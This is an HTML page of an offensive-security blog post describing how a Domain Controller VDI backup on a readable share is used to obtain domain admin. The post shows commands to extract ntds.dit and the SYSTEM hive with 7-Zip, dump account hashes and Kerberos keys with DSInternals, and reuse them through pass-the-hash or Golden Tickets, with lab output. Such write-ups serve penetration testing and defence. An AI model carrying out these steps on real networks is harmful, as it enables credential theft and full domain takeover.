@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="your description">
+    <meta name="Author" content="Rasta Mouse">
+    <meta name="keywords" content="offensive security">
+    <link rel="stylesheet" href=https://rastamouse.me/css/syntax.css>
+    <link rel="stylesheet" href=https://rastamouse.me/css/style.css>
+    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
+    <title>Cheesy Rumbles</title>
+  </head><body><aside id="sidenav">
+    <header>
+    
+        <a href=https://rastamouse.me><img src="https://rastamouse.me/avatar.png" alt="avatar"></a>
+        
+    
+
+    <a id="branding" href=https://rastamouse.me>
+        
+            Cheesy Rumbles
+        
+    </a>
+    </header>
+
+    <nav>
+        
+            		
+            <a href="/"
+                
+            >
+                <i class="fas fa-home fa-sm"></i>
+                <span>home</span>
+            </a>
+        
+            		
+            <a href="/blog/"
+                
+            >
+                <i class="fas fa-keyboard fa-ms"></i>
+                <span>blog</span>
+            </a>
+        
+            		
+            <a href="/tags"
+                
+            >
+                <i class="fas fa-tags fa-ms"></i>
+                <span>tags</span>
+            </a>
+        
+            		
+            <a href="https://twitter.com/_RastaMouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-twitter fa-ms"></i>
+                <span>twitter</span>
+            </a>
+        
+            		
+            <a href="https://github.com/rasta-mouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-github fa-ms"></i>
+                <span>github</span>
+            </a>
+        
+            		
+            <a href="/index.xml"
+                
+            >
+                <i class="fas fa-rss fa-ms"></i>
+                <span>RSS</span>
+            </a>
+        
+    </nav>
+</aside>
+<main id="main">
+            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
+            <div class="content">
+    
+    <h1 id="title">VHD to DA</h1>
+    
+      
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#listing-domain-shares">Listing Domain Shares</a></li>
+    <li><a href="#find-interesting-files">Find Interesting Files</a></li>
+    <li><a href="#extract-the-secrets">Extract the Secrets</a></li>
+    <li><a href="#7-zip">7-Zip</a></li>
+    <li><a href="#dumping-creds">Dumping Creds</a></li>
+    <li><a href="#improvements">Improvements?</a></li>
+  </ul>
+</nav>
+    <p>Where a 10-year old backup can fcuk you in the ass&hellip;</p>
+<p>My favourite ways to get DA (or other elevated privilege), is by taking advantage of random stuff just lying around the environment.  I came across a brilliant example of this last week, which involved a VHD backup from a Domain Controller (you can see where this is going).</p>
+<p>This wasn&rsquo;t a full outside-&gt;in attack; I had access to a legit desktop as a Domain User.</p>
+<h2 id="listing-domain-shares">Listing Domain Shares</h2>
+<p>We can start off by dumping all of the domain shares that the current user has read access to.</p>
+<pre><code>PS C:\Users\testuser&gt; Find-DomainShare -CheckShareAccess | fl | Out-File domain-shares.txt
+</code></pre><pre><code>PS C:\Users\testuser&gt; gc .\domain-shares.txt
+
+
+Name         : Backup$
+Type         : 0
+Remark       :
+ComputerName : dc01.testlab.local
+
+Name         : NETLOGON
+Type         : 0
+Remark       : Logon server share
+ComputerName : dc01.testlab.local
+
+Name         : SYSVOL
+Type         : 0
+Remark       : Logon server share
+ComputerName : dc01.testlab.local
+</code></pre><p>We see an interesting hidden share called <code>Backup$</code> on <code>dc01</code>.</p>
+<h2 id="find-interesting-files">Find Interesting Files</h2>
+<p>Next, list the file content and verify the file permissions.</p>
+<pre><code>PS C:\Users\testuser&gt; ls \\dc01\backup$
+
+
+    Directory: \\dc01\backup$
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       03/02/2018     14:58    10966007808 dc01.testlab.local.vdi
+</code></pre><pre><code>PS C:\Users\testuser&gt; icacls \\dc01\backup$\dc01.testlab.local.vdi
+\\dc01\backup$\dc01.testlab.local.vdi LAB\Domain Users:(I)(RX,W)
+                                      NT AUTHORITY\SYSTEM:(I)(F)
+                                      BUILTIN\Administrators:(I)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+</code></pre><p>These permissions are inherited from the share directory on <code>dc01</code>, and grants all Domain Users read, write and execute rights on <code>dc01.testlab.local.vdi</code>.</p>
+<h2 id="extract-the-secrets">Extract the Secrets</h2>
+<p>At this point, I think most articles will suggest downloading &amp; mounting the virtual image so you can extract the information you want.  There are two issues with this approach:</p>
+<ul>
+<li>You need local admin on Windows to mount a VHD (which you might not have in the target env).</li>
+<li>VHDs are usually pretty big and a lot of data to move internally, even more so to exfil to a machine you control outside the target env.  Right <a href="https://twitter.com/424f424f">Steve</a> ;)</li>
+</ul>
+<p>It would be much better imo if we could just extract the two files we need directly.</p>
+<h2 id="7-zip">7-Zip</h2>
+<p>The 7-Zip File Manager is a great option if the circumstances allow.  I was able to drop <code>7zFM.exe</code> and <code>7z.dll</code> to the domain workstation, then extract the exact two files I wanted.</p>
+<p><code>\\dc01\backup$\dc01.testlab.local.vdi\1.ntfs\Windows\NTDS\ntds.dit</code>
+<code>\\dc01\backup$\dc01.testlab.local.vdi\1.ntfs\Windows\System32\config\SYSTEM</code></p>
+<figure>
+    <img src="/images/vhd/7zfm.png"/> 
+</figure>
+
+<p>Better yet, you can extract these directly to your machine (rather than extracting them into the share directory and copying them across separately).</p>
+<figure>
+    <img src="/images/vhd/extract.png"/> 
+</figure>
+
+<pre><code>PS C:\Users\testuser&gt; ls
+
+
+    Directory: C:\Users\testuser
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---       18/01/2018     20:35                Contacts
+d-r---       17/02/2018     12:34                Desktop
+d-r---       18/01/2018     20:35                Documents
+d-r---       18/01/2018     20:35                Downloads
+d-r---       18/01/2018     20:35                Favorites
+d-r---       18/01/2018     20:35                Links
+d-r---       18/01/2018     20:35                Music
+d-r---       18/01/2018     20:35                OneDrive
+d-r---       18/01/2018     20:35                Pictures
+d-r---       18/01/2018     20:35                Saved Games
+d-r---       18/01/2018     20:35                Searches
+d-r---       18/01/2018     20:35                Videos
+------       04/10/2016     17:06        1609216 7z.dll
+-a----       04/10/2016     15:54         839168 7zFM.exe
+-a----       17/02/2018     11:47           1140 domain-shares.txt
+-a----       26/01/2018     22:01       20971520 ntds.dit
+-a----       26/01/2018     22:01       12582912 SYSTEM
+</code></pre><h2 id="dumping-creds">Dumping Creds</h2>
+<p>I exfiltrated <code>ntds.dit</code> and <code>SYSTEM</code> to my external machine and decided to try the <a href="https://www.dsinternals.com/en/dumping-ntds-dit-files-using-powershell/">DS Internals</a> PowerShell modules.</p>
+<p>Here&rsquo;s an example of its use:</p>
+<pre><code>PS C:\Users\Rasta\Desktop&gt; $key = Get-BootKey -SystemHivePath .\SYSTEM
+PS C:\Users\Rasta\Desktop&gt; Get-ADDBAccount -SamAccountName 'TestUser' -DBPath .\ntds.dit -BootKey $key
+
+DistinguishedName: CN=Test User,CN=Users,DC=testlab,DC=local
+Sid: S-1-5-21-685307900-2367635464-2133520042-1104
+Guid: a7e9722e-c8e6-44d8-9718-5686adc84d5a
+SamAccountName: testuser
+SamAccountType: User
+UserPrincipalName: testuser@testlab.local
+PrimaryGroupId: 513
+SidHistory:
+Enabled: True
+UserAccountControl: NormalAccount, PasswordNeverExpires
+AdminCount: False
+Deleted: False
+LastLogon: 17/02/2018 12:26:07
+DisplayName: Test User
+GivenName: Test
+Surname: User
+Description:
+ServicePrincipalName:
+SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, SelfRelative
+Owner: S-1-5-21-685307900-2367635464-2133520042-512
+Secrets
+  NTHash: fc525c9683e8fe067095ba2ddc971889
+  LMHash:
+  NTHashHistory:
+    Hash 01: fc525c9683e8fe067095ba2ddc971889
+  LMHashHistory:
+    Hash 01: fa305938fd3a4e76a2c7b1bf11a6a18a
+  SupplementalCredentials:
+    ClearText:
+    NTLMStrongHash: dc42f9b4c525a0a145ab8303cdf8ebcf
+    Kerberos:
+      Credentials:
+        DES_CBC_MD5
+          Key: a4b67915c8526476
+      OldCredentials:
+      Salt: TESTLAB.LOCALtestuser
+      Flags: 0
+    KerberosNew:
+      Credentials:
+        AES256_CTS_HMAC_SHA1_96
+          Key: 950e12c1f1b3cf2536834550cb947ed09fc7b6e8a27371cfcadff4dc35b2e200
+          Iterations: 4096
+        AES128_CTS_HMAC_SHA1_96
+          Key: 5ee798833e2dc4aca49ed9a2d816aa60
+          Iterations: 4096
+        DES_CBC_MD5
+          Key: a4b67915c8526476
+          Iterations: 4096
+      OldCredentials:
+      OlderCredentials:
+      ServiceCredentials:
+      Salt: TESTLAB.LOCALtestuser
+      DefaultIterationCount: 4096
+      Flags: 0
+    WDigest:
+      Hash 01: b5062942b81ab51387e6ee5444c75c98
+      Hash 02: 3a3db08999164924e88823d249c8af45
+      Hash 03: 0a0dc041414c282bf989424c5f948d09
+      Hash 04: b5062942b81ab51387e6ee5444c75c98
+      Hash 05: 3a3db08999164924e88823d249c8af45
+      Hash 06: ecc6a9c1815bea8adc69877a6c9be8bb
+      Hash 07: b5062942b81ab51387e6ee5444c75c98
+      Hash 08: ba3981f46d68b04626c18c49664502a3
+      Hash 09: ba3981f46d68b04626c18c49664502a3
+      Hash 10: 9093651592378198707ea0b7b10d63c5
+      Hash 11: 906bcd8e0e795d4e449114652dd8fb94
+      Hash 12: ba3981f46d68b04626c18c49664502a3
+      Hash 13: 044ed781762f98964f5f9fdd6a7a2724
+      Hash 14: 906bcd8e0e795d4e449114652dd8fb94
+      Hash 15: ca5018f3376aeb6c2a313df74dab36d5
+      Hash 16: ca5018f3376aeb6c2a313df74dab36d5
+      Hash 17: 4b96c357eb3bb9c7df7dcf95e67b9f4b
+      Hash 18: 09e178a0ccffd3fca5b4febb8a3880a9
+      Hash 19: 3d00b89bfab11a3257c5297d4d2315d0
+      Hash 20: 0eac68e6c7a9a3781fef5e4ad0593016
+      Hash 21: 79a1f49737bf634b2c6ff6cf33679f0d
+      Hash 22: 79a1f49737bf634b2c6ff6cf33679f0d
+      Hash 23: 024c49ae479c588b20353ccc777e486a
+      Hash 24: fb8170f67f7f5fd79f9d9664819bf4bb
+      Hash 25: fb8170f67f7f5fd79f9d9664819bf4bb
+      Hash 26: ed583eb40396fbfbdb147696fbf2b537
+      Hash 27: 3bd70fb036ef316b21c06ccb229be2cd
+      Hash 28: e03a002b7d9197d33923078317b3e72f
+      Hash 29: 77ac5a611d39db8a0a142e245e43ef16
+Credential Roaming
+  Created:
+  Modified:
+  Credentials:
+</code></pre><p>The <code>UserAccountControl</code> field is great to target accounts that have <code>PasswordNeverExpires</code> set, then use those NTLM hashes with PTH or PSEXEC.  You could also attempt to crack the hashes to recover plaintext passwords.</p>
+<p>There&rsquo;s also lots of fun to be had with the krbtgt hash, such as Golden Tickets.</p>
+<h2 id="improvements">Improvements?</h2>
+<p>The 7-Zip File Manager can only be used with a GUI, so what if we only had a shell?</p>
+<p>There is also a command line version of 7z.</p>
+<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe
+
+7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04
+
+Usage: 7z &lt;command&gt; [&lt;switches&gt;...] &lt;archive_name&gt; [&lt;file_names&gt;...]
+       [&lt;@listfiles...&gt;]
+
+&lt;Commands&gt;
+  a : Add files to archive
+  b : Benchmark
+  d : Delete files from archive
+  e : Extract files from archive (without using directory names)
+  h : Calculate hash values for files
+  i : Show information about supported formats
+  l : List contents of archive
+  rn : Rename files in archive
+  t : Test integrity of archive
+  u : Update files to archive
+  x : eXtract files with full paths
+</code></pre><p>However, you don&rsquo;t appear to be able to list or extract files in the archive recursively (even though there&rsquo;s an option for it).</p>
+<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe l &quot;E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi&quot;
+
+7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04
+
+Scanning the drive for archives:
+1 file, 32047628288 bytes (30 GiB)
+
+Listing archive: E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
+
+--
+Path = E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
+Type = VDI
+Physical Size = 32047628288
+Headers Size = 2097152
+Method = Dynamic
+----
+Size = 107374182400
+Packed Size = 32045531136
+--
+Path = dc01.testlab.local.mbr
+Type = MBR
+Physical Size = 107374182400
+
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+                    .....    524288000    524288000  0.ntfs
+                    ..... 106847797248 106847797248  1.ntfs
+                    .....      1048576      1048576  2
+------------------- ----- ------------ ------------  ------------------------
+                          107373133824 107373133824  3 files
+</code></pre><pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe e &quot;E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi&quot; -oC:\Users\Rasta\Desktop ntds.dit -r
+
+7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04
+
+Scanning the drive for archives:
+1 file, 32047628288 bytes (30 GiB)
+
+Extracting archive: E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
+--
+Path = E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
+Type = VDI
+Physical Size = 32047628288
+Headers Size = 2097152
+Method = Dynamic
+----
+Size = 107374182400
+Packed Size = 32045531136
+--
+Path = dc01.testlab.local.mbr
+Type = MBR
+Physical Size = 107374182400
+
+
+No files to process
+Everything is Ok
+
+Files: 0
+Size:       0
+Compressed: 32047628288
+</code></pre><p>If anybody knows how to actually do this, I&rsquo;d love to hear from you!</p>
+<p>The lame way, is to extract <code>1.ntfs</code> first.</p>
+<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe e &quot;E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi&quot; -oC:\Users\Rasta\Desktop 1.ntfs
+
+7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04
+
+Scanning the drive for archives:
+1 file, 32047628288 bytes (30 GiB)
+
+Extracting archive: E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
+--
+Path = E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
+Type = VDI
+Physical Size = 32047628288
+Headers Size = 2097152
+Method = Dynamic
+----
+Size = 107374182400
+Packed Size = 32045531136
+--
+Path = dc01.testlab.local.mbr
+Type = MBR
+Physical Size = 107374182400
+
+Everything is Ok
+
+Size:       106847797248
+Compressed: 32047628288
+</code></pre><pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe l ..\1.ntfs | more
+
+7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04
+
+Scanning the drive for archives:
+1 file, 106847797248 bytes (100 GiB)
+
+Listing archive: ..\1.ntfs
+
+--
+Path = ..\1.ntfs
+Type = NTFS
+Physical Size = 106847797248
+File System = NTFS 3.1
+Cluster Size = 4096
+Sector Size = 512
+Record Size = 1024
+Created = 2018-01-15 04:09:04
+ID = 5766460664093954998
+
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+2018-01-15 04:09:04 ..HS.    110362624    110362624  [SYSTEM]\$MFT
+2018-01-15 04:09:04 ..HS.         4096         4096  [SYSTEM]\$MFTMirr
+2018-01-15 04:09:04 ..HS.     67108864     67108864  [SYSTEM]\$LogFile
+2018-01-15 04:09:04 ..HS.            0            0  [SYSTEM]\$Volume
+2018-01-15 04:09:04 ..HS.         2560         4096  [SYSTEM]\$AttrDef
+2018-02-15 20:13:10 D.HS.                            [SYSTEM]\.
+2018-01-15 04:09:04 ..HS.      3260736      3264512  [SYSTEM]\$Bitmap
+2018-01-15 04:09:04 ..HS.         8192         8192  [SYSTEM]\$Boot
+-- More  --
+</code></pre><pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe e ..\1.ntfs -oC:\Users\Rasta\Desktop Windows\NTDS\ntds.dit
+
+7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04
+
+Scanning the drive for archives:
+1 file, 106847797248 bytes (100 GiB)
+
+Extracting archive: ..\1.ntfs
+--
+Path = ..\1.ntfs
+Type = NTFS
+Physical Size = 106847797248
+File System = NTFS 3.1
+Cluster Size = 4096
+Sector Size = 512
+Record Size = 1024
+Created = 2018-01-15 04:09:04
+ID = 5766460664093954998
+
+Everything is Ok
+
+Size:       20971520
+Compressed: 106847797248
+</code></pre><pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe e ..\1.ntfs -oC:\Users\Rasta\Desktop Windows\System32\config\SYSTEM
+
+7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04
+
+Scanning the drive for archives:
+1 file, 106847797248 bytes (100 GiB)
+
+Extracting archive: ..\1.ntfs
+--
+Path = ..\1.ntfs
+Type = NTFS
+Physical Size = 106847797248
+File System = NTFS 3.1
+Cluster Size = 4096
+Sector Size = 512
+Record Size = 1024
+Created = 2018-01-15 04:09:04
+ID = 5766460664093954998
+
+Everything is Ok
+
+Size:       12582912
+Compressed: 106847797248
+</code></pre>
+    
+    <div class="nav-next-prev">
+        <div class="nav-prev">
+            
+                <a href="https://rastamouse.me/blog/terraform-pt2/"><i class="fas fa-chevron-left"></i></a>
+            
+        </div>
+        <a class="nav-top" href="#">top</i></a>
+        <div class="nav-next">
+            
+                <a href="https://rastamouse.me/blog/encrypted-ebs/"><i class="fas fa-chevron-right"></i></a>
+            
+        </div>
+    </div>
+    
+
+            </div><footer>
+<div class="footer-content">
+
+
+<p class="copyright meta">This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.</p>
+
+</div>
+</footer></main>
+    </body>
+    <script src=https://rastamouse.me/js/navbutton.js></script>
+</html>
